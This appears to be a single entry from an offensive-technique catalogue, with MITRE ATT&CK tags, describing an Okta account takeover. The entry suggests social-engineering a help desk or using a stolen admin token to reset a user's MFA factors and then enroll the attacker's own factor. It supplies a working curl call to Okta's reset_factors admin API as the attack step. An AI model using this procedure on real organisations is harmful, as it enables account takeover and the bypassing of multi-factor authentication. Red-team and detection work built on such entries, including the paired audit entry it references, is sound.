---
id: okta-mfa-reset
title: Okta MFA reset → enroll attacker factor (account takeover)
section: Okta / identity provider
phase: Credential Access
attack:
  tactic: TA0006
  techniques: [T1556.006]
platform: [okta]
source: Scattered Spider / Okta help-desk social engineering
pair: okta-mfa-reset-audit
---

The Scattered-Spider classic: social-engineer the help desk (or use a compromised
admin token) to reset a target's MFA factors, then enroll your own — full account
takeover, MFA included. The admin API does it in one call; the console "Reset
Multifactor" is the click-path. (Cloud IdP — no on-host target, so no slots.)

```sh
curl -s -X POST "https://<org>.okta.com/api/v1/users/<userId>/lifecycle/reset_factors" -H "Authorization: SSWS <api-token>"
```
